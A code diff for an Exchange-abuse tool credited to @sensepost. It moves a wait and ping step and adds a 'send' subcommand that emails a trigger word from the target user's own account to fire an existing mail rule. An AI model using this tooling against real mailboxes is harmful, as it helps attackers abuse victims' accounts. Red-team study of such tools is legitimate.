@@ -210,6 +210,12 @@ func addRule(c *cli.Context) error {
 	}
 
 	if c.Bool("send") {
+		fmt.Println("[*] Auto Send enabled, wait 30 seconds before sending email (synchronisation)")
+		//initate a ping sequence, just incase we are on RPC/HTTP
+		//we need to keep the socket open
+		go mapi.Ping()
+		time.Sleep(time.Second * (time.Duration)(30))
+		fmt.Println("[*] Sending email")
 		sendMessage(c.String("trigger"))
 	}
 
@@ -257,13 +263,6 @@ func displayRules(c *cli.Context) error {
 }
 
 func sendMessage(triggerword string) error {
-
-	fmt.Println("[*] Auto Send enabled, wait 30 seconds before sending email (synchronisation)")
-	//initate a ping sequence, just incase we are on RPC/HTTP
-	//we need to keep the socket open
-	go mapi.Ping()
-	time.Sleep(time.Second * (time.Duration)(30))
-	fmt.Println("[*] Sending email")
 
 	propertyTags := make([]mapi.PropertyTag, 1)
 	propertyTags[0] = mapi.PidTagDisplayName
@@ -586,6 +585,30 @@ A tool by @sensepost to abuse Exchange Services.`
 					return cli.NewExitError(err, 1)
 				}
 				fmt.Println("[*] Looks like we are good to go!")
+				return nil
+			},
+		},
+		{
+			Name:    "send",
+			Aliases: []string{"s"},
+			Usage:   "Send an email to trigger an existing rule. This uses the target user's own account.",
+			Flags: []cli.Flag{
+				cli.StringFlag{
+					Name:  "trigger,t",
+					Value: "",
+					Usage: "A trigger word or phrase to use",
+				},
+			},
+			Action: func(c *cli.Context) error {
+				//check that trigger word was supplied
+				if c.String("trigger") == "" {
+					return cli.NewExitError("The trigger word/phrase is required. Use --trigger", 1)
+				}
+				err := connect(c)
+				if err != nil {
+					return cli.NewExitError(err, 1)
+				}
+				sendMessage(c.String("trigger"))
 				return nil
 			},
 		},
